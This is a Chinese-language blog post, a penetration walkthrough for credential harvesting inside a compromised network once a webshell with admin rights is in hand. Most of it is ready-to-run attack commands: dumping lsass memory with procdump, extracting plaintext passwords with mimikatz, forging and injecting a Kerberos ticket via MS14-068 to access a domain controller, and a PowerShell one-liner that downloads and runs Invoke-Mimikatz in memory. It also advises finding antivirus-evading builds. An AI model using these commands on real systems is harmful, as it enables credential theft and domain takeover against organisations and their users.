---
layout: post
title: 内网渗透：密码信息收集 mimikatz ms14-068
date: 2019-12-20
categories: blog
tags: [内网，密码，mimikatz，procdump]
description: 内网，密码，mimikatz，procdump
---

#### 一、环境
- 拿到webshell，并且是管理员权限，之后要为内网渗透收集信息，比如本机密码、域用户密码、wiff密码等

#### 二、procdump
- procdump + mimikatz（这两个exe百分百被杀，需要找免杀版或在没杀软使用）
上传procdump.exe从lsass.exe获取密码文件，在 lsass.exe 里并不是只存有 lm hash 和 ntlm hash 而已应该还存在有你的明文密码经过某种加密算法 (注意: 是加密算法 而不是hash算法 加密算法是可逆的 hash算法是不可逆的)
```shell
procdump64.exe -accepteula -ma lsass.exe lsass.dmp 注意64位32位
```
将生成的lsass.dmp下载到本地，使用mimikatz解密
```shell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

#### 三、mimikatz（管理员权限）

1、结合procdump解密如上

2、上传mimikatz.exe直接在目标机器上解密
-
```shell
mimikatz.exe "privilege::debug" exit
mimikatz.exe "sekurlsa::logonpasswords" exit
```

3、mimikatz结合ms14-068拿域控（在域内肉鸡上执行）
- 利用ms14-068生成cache
```shell
MS14-068.exe -u zhangsan@DD11.com -s S-1-5-21-1120997190-3826596690-715383689-2222 -d 10.0.0.216 -p asd2xsaf2@!axas6N（此命令会生成一个cache文件）
```
- 注入票据
```shell
mimikatz.exe "kerberos::purge" exit //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz.exe "kerberos::list" exit //查看当前机器凭证
mimikatz.exe "kerberos::ptc TGT_zhangsan@DD11.com.ccache" exit //将票据注入到内存中
```
- 利用伪造好的票据登录域控服务器
```shell
net use \\A-635ECAEE64804.TEST.LOCAL //此处填域的名称
dir \\A-635ECAEE64804.TEST.LOCAL\c$
```

4、通过powershell无文件加载mimikatz
- 
```shell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```













